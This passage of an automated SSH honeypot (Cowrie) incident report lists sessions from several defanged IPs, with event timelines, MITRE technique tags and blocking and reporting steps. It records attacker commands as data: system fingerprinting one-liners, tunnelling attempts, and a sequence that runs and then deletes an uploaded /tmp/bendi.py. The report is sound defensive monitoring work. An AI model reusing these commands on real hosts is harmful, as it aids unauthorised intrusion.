| `2026-08-04 12:16:24` | `cowrie.client.version` |
| `2026-08-04 12:16:24` | `cowrie.client.kex` |
| `2026-08-04 12:16:27` | `cowrie.login.success` |
| `2026-08-04 12:16:29` | `cowrie.session.params` |
| `2026-08-04 12:16:29` | `cowrie.command.input` |
| `2026-08-04 12:16:29` | `cowrie.command.input` |
| `2026-08-04 12:16:29` | `cowrie.command.input` |
| `2026-08-04 12:16:29` | `cowrie.command.input` |
| `2026-08-04 12:16:29` | `cowrie.command.input` |
| `2026-08-04 12:16:29` | `cowrie.command.success` |
| `2026-08-04 12:16:29` | `cowrie.command.input` |
| `2026-08-04 12:16:29` | `cowrie.command.input` |
| `2026-08-04 12:16:29` | `cowrie.command.input` |
| `2026-08-04 12:16:29` | `cowrie.command.input` |
| `2026-08-04 12:16:30` | `cowrie.log.closed` |
| `2026-08-04 12:16:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdd4aa0e13da

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:17 |
| **Last Seen** | 2026-08-04 12:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:17:21` | `cowrie.session.connect` |
| `2026-08-04 12:17:21` | `cowrie.client.version` |
| `2026-08-04 12:17:22` | `cowrie.client.kex` |
| `2026-08-04 12:17:22` | `cowrie.login.success` |
| `2026-08-04 12:17:23` | `cowrie.session.params` |
| `2026-08-04 12:17:23` | `cowrie.command.input` |
| `2026-08-04 12:17:23` | `cowrie.log.closed` |
| `2026-08-04 12:17:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aebf01a7c4c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:18 |
| **Last Seen** | 2026-08-04 12:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:18:07` | `cowrie.session.connect` |
| `2026-08-04 12:18:07` | `cowrie.client.version` |
| `2026-08-04 12:18:07` | `cowrie.client.kex` |
| `2026-08-04 12:18:10` | `cowrie.login.success` |
| `2026-08-04 12:18:11` | `cowrie.session.params` |
| `2026-08-04 12:18:11` | `cowrie.command.input` |
| `2026-08-04 12:18:11` | `cowrie.command.input` |
| `2026-08-04 12:18:11` | `cowrie.command.input` |
| `2026-08-04 12:18:11` | `cowrie.command.input` |
| `2026-08-04 12:18:11` | `cowrie.command.input` |
| `2026-08-04 12:18:11` | `cowrie.command.success` |
| `2026-08-04 12:18:11` | `cowrie.command.input` |
| `2026-08-04 12:18:11` | `cowrie.command.input` |
| `2026-08-04 12:18:11` | `cowrie.command.input` |
| `2026-08-04 12:18:11` | `cowrie.command.input` |
| `2026-08-04 12:18:12` | `cowrie.log.closed` |
| `2026-08-04 12:18:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f64bd8d8fab4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:19 |
| **Last Seen** | 2026-08-04 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:19:01` | `cowrie.session.connect` |
| `2026-08-04 12:19:01` | `cowrie.client.version` |
| `2026-08-04 12:19:01` | `cowrie.client.kex` |
| `2026-08-04 12:19:01` | `cowrie.login.success` |
| `2026-08-04 12:19:02` | `cowrie.session.params` |
| `2026-08-04 12:19:02` | `cowrie.command.input` |
| `2026-08-04 12:19:02` | `cowrie.log.closed` |
| `2026-08-04 12:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c7e0970dbef

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:19 |
| **Last Seen** | 2026-08-04 12:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:19:46` | `cowrie.session.connect` |
| `2026-08-04 12:19:46` | `cowrie.client.version` |
| `2026-08-04 12:19:46` | `cowrie.client.kex` |
| `2026-08-04 12:19:48` | `cowrie.login.success` |
| `2026-08-04 12:19:50` | `cowrie.session.params` |
| `2026-08-04 12:19:50` | `cowrie.command.input` |
| `2026-08-04 12:19:50` | `cowrie.command.input` |
| `2026-08-04 12:19:50` | `cowrie.command.input` |
| `2026-08-04 12:19:50` | `cowrie.command.input` |
| `2026-08-04 12:19:50` | `cowrie.command.input` |
| `2026-08-04 12:19:50` | `cowrie.command.success` |
| `2026-08-04 12:19:50` | `cowrie.command.input` |
| `2026-08-04 12:19:50` | `cowrie.command.input` |
| `2026-08-04 12:19:50` | `cowrie.command.input` |
| `2026-08-04 12:19:50` | `cowrie.command.input` |
| `2026-08-04 12:19:50` | `cowrie.log.closed` |
| `2026-08-04 12:19:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d53c89270b52

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:20 |
| **Last Seen** | 2026-08-04 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:20:36` | `cowrie.session.connect` |
| `2026-08-04 12:20:36` | `cowrie.client.version` |
| `2026-08-04 12:20:37` | `cowrie.client.kex` |
| `2026-08-04 12:20:37` | `cowrie.login.success` |
| `2026-08-04 12:20:38` | `cowrie.session.params` |
| `2026-08-04 12:20:38` | `cowrie.command.input` |
| `2026-08-04 12:20:38` | `cowrie.log.closed` |
| `2026-08-04 12:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fca4fa639bc9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:21 |
| **Last Seen** | 2026-08-04 12:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:21:23` | `cowrie.session.connect` |
| `2026-08-04 12:21:23` | `cowrie.client.version` |
| `2026-08-04 12:21:23` | `cowrie.client.kex` |
| `2026-08-04 12:21:25` | `cowrie.login.success` |
| `2026-08-04 12:21:26` | `cowrie.session.params` |
| `2026-08-04 12:21:26` | `cowrie.command.input` |
| `2026-08-04 12:21:26` | `cowrie.command.input` |
| `2026-08-04 12:21:26` | `cowrie.command.input` |
| `2026-08-04 12:21:26` | `cowrie.command.input` |
| `2026-08-04 12:21:26` | `cowrie.command.input` |
| `2026-08-04 12:21:26` | `cowrie.command.success` |
| `2026-08-04 12:21:26` | `cowrie.command.input` |
| `2026-08-04 12:21:26` | `cowrie.command.input` |
| `2026-08-04 12:21:26` | `cowrie.command.input` |
| `2026-08-04 12:21:26` | `cowrie.command.input` |
| `2026-08-04 12:21:27` | `cowrie.log.closed` |
| `2026-08-04 12:21:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c1ce55c33df

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:22 |
| **Last Seen** | 2026-08-04 12:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:22:18` | `cowrie.session.connect` |
| `2026-08-04 12:22:18` | `cowrie.client.version` |
| `2026-08-04 12:22:18` | `cowrie.client.kex` |
| `2026-08-04 12:22:18` | `cowrie.login.success` |
| `2026-08-04 12:22:19` | `cowrie.session.params` |
| `2026-08-04 12:22:19` | `cowrie.command.input` |
| `2026-08-04 12:22:19` | `cowrie.log.closed` |
| `2026-08-04 12:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7905796f57b9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:23 |
| **Last Seen** | 2026-08-04 12:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:23:00` | `cowrie.session.connect` |
| `2026-08-04 12:23:00` | `cowrie.client.version` |
| `2026-08-04 12:23:00` | `cowrie.client.kex` |
| `2026-08-04 12:23:01` | `cowrie.login.success` |
| `2026-08-04 12:23:03` | `cowrie.session.params` |
| `2026-08-04 12:23:03` | `cowrie.command.input` |
| `2026-08-04 12:23:03` | `cowrie.command.input` |
| `2026-08-04 12:23:03` | `cowrie.command.input` |
| `2026-08-04 12:23:03` | `cowrie.command.input` |
| `2026-08-04 12:23:03` | `cowrie.command.input` |
| `2026-08-04 12:23:03` | `cowrie.command.success` |
| `2026-08-04 12:23:03` | `cowrie.command.input` |
| `2026-08-04 12:23:03` | `cowrie.command.input` |
| `2026-08-04 12:23:03` | `cowrie.command.input` |
| `2026-08-04 12:23:03` | `cowrie.command.input` |
| `2026-08-04 12:23:03` | `cowrie.log.closed` |
| `2026-08-04 12:23:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6358695719db

| Field | Detail |
|---|---|
| **Source IP** | `61.186.136[.]36` |
| **First Seen** | 2026-08-04 12:23 |
| **Last Seen** | 2026-08-04 12:24 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:23:55` | `cowrie.session.connect` |
| `2026-08-04 12:23:56` | `cowrie.client.version` |
| `2026-08-04 12:23:56` | `cowrie.client.kex` |
| `2026-08-04 12:24:01` | `cowrie.login.success` |
| `2026-08-04 12:24:02` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:24:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.186.136[.]36` to AbuseIPDB if not already reported
- [ ] Block `61.186.136[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2b6ab533199

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:23 |
| **Last Seen** | 2026-08-04 12:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:23:59` | `cowrie.session.connect` |
| `2026-08-04 12:23:59` | `cowrie.client.version` |
| `2026-08-04 12:23:59` | `cowrie.client.kex` |
| `2026-08-04 12:23:59` | `cowrie.login.success` |
| `2026-08-04 12:24:00` | `cowrie.session.params` |
| `2026-08-04 12:24:00` | `cowrie.command.input` |
| `2026-08-04 12:24:00` | `cowrie.log.closed` |
| `2026-08-04 12:24:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a4513a73d2c

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-08-04 12:24 |
| **Last Seen** | 2026-08-04 12:24 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:24:10` | `cowrie.session.connect` |
| `2026-08-04 12:24:11` | `cowrie.client.version` |
| `2026-08-04 12:24:11` | `cowrie.client.kex` |
| `2026-08-04 12:24:14` | `cowrie.login.success` |
| `2026-08-04 12:24:16` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c18dcc7d615

| Field | Detail |
|---|---|
| **Source IP** | `201.63.52[.]54` |
| **First Seen** | 2026-08-04 12:24 |
| **Last Seen** | 2026-08-04 12:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:24:13` | `cowrie.session.connect` |
| `2026-08-04 12:24:14` | `cowrie.client.version` |
| `2026-08-04 12:24:14` | `cowrie.client.kex` |
| `2026-08-04 12:24:16` | `cowrie.login.success` |
| `2026-08-04 12:24:17` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.52[.]54` to AbuseIPDB if not already reported
- [ ] Block `201.63.52[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-016268368002

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]192` |
| **First Seen** | 2026-08-04 12:24 |
| **Last Seen** | 2026-08-04 12:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:24:15` | `cowrie.session.connect` |
| `2026-08-04 12:24:15` | `cowrie.client.version` |
| `2026-08-04 12:24:15` | `cowrie.client.kex` |
| `2026-08-04 12:24:16` | `cowrie.login.success` |
| `2026-08-04 12:24:16` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:24:16` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:24:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]192` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85e1c76375fe

| Field | Detail |
|---|---|
| **Source IP** | `218.149.228[.]138` |
| **First Seen** | 2026-08-04 12:24 |
| **Last Seen** | 2026-08-04 12:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:24:23` | `cowrie.session.connect` |
| `2026-08-04 12:24:23` | `cowrie.client.version` |
| `2026-08-04 12:24:23` | `cowrie.client.kex` |
| `2026-08-04 12:24:26` | `cowrie.login.success` |
| `2026-08-04 12:24:26` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.228[.]138` to AbuseIPDB if not already reported
- [ ] Block `218.149.228[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9a8e8623c67

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:24 |
| **Last Seen** | 2026-08-04 12:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:24:39` | `cowrie.session.connect` |
| `2026-08-04 12:24:39` | `cowrie.client.version` |
| `2026-08-04 12:24:39` | `cowrie.client.kex` |
| `2026-08-04 12:24:41` | `cowrie.login.success` |
| `2026-08-04 12:24:42` | `cowrie.session.params` |
| `2026-08-04 12:24:42` | `cowrie.command.input` |
| `2026-08-04 12:24:42` | `cowrie.command.input` |
| `2026-08-04 12:24:42` | `cowrie.command.input` |
| `2026-08-04 12:24:42` | `cowrie.command.input` |
| `2026-08-04 12:24:42` | `cowrie.command.input` |
| `2026-08-04 12:24:42` | `cowrie.command.success` |
| `2026-08-04 12:24:42` | `cowrie.command.input` |
| `2026-08-04 12:24:42` | `cowrie.command.input` |
| `2026-08-04 12:24:42` | `cowrie.command.input` |
| `2026-08-04 12:24:42` | `cowrie.command.input` |
| `2026-08-04 12:24:43` | `cowrie.log.closed` |
| `2026-08-04 12:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53700e4e16f8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:25 |
| **Last Seen** | 2026-08-04 12:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:25:35` | `cowrie.session.connect` |
| `2026-08-04 12:25:35` | `cowrie.client.version` |
| `2026-08-04 12:25:35` | `cowrie.client.kex` |
| `2026-08-04 12:25:35` | `cowrie.login.success` |
| `2026-08-04 12:25:36` | `cowrie.session.params` |
| `2026-08-04 12:25:36` | `cowrie.command.input` |
| `2026-08-04 12:25:37` | `cowrie.log.closed` |
| `2026-08-04 12:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-786514ad596a

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-08-04 12:25 |
| **Last Seen** | 2026-08-04 12:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:25:43` | `cowrie.session.connect` |
| `2026-08-04 12:25:43` | `cowrie.client.version` |
| `2026-08-04 12:25:43` | `cowrie.client.kex` |
| `2026-08-04 12:25:44` | `cowrie.login.success` |
| `2026-08-04 12:25:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e784c49c976

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-08-04 12:25 |
| **Last Seen** | 2026-08-04 12:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:25:43` | `cowrie.session.connect` |
| `2026-08-04 12:25:43` | `cowrie.client.version` |
| `2026-08-04 12:25:43` | `cowrie.client.kex` |
| `2026-08-04 12:25:44` | `cowrie.login.success` |
| `2026-08-04 12:25:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51d098cf9ab3

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-08-04 12:26 |
| **Last Seen** | 2026-08-04 12:28 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:26:04` | `cowrie.session.connect` |
| `2026-08-04 12:26:04` | `cowrie.client.version` |
| `2026-08-04 12:26:04` | `cowrie.client.kex` |
| `2026-08-04 12:26:05` | `cowrie.login.success` |
| `2026-08-04 12:26:07` | `cowrie.session.file_upload` |
| `2026-08-04 12:26:08` | `cowrie.session.params` |
| `2026-08-04 12:26:08` | `cowrie.command.input` |
| `2026-08-04 12:26:08` | `cowrie.command.input` |
| `2026-08-04 12:26:08` | `cowrie.command.input` |
| `2026-08-04 12:26:08` | `cowrie.command.failed` |
| `2026-08-04 12:26:09` | `cowrie.log.closed` |
| `2026-08-04 12:26:10` | `cowrie.session.params` |
| `2026-08-04 12:26:10` | `cowrie.command.input` |
| `2026-08-04 12:26:10` | `cowrie.log.closed` |
| `2026-08-04 12:26:11` | `cowrie.session.params` |
| `2026-08-04 12:26:11` | `cowrie.command.input` |
| `2026-08-04 12:26:11` | `cowrie.log.closed` |
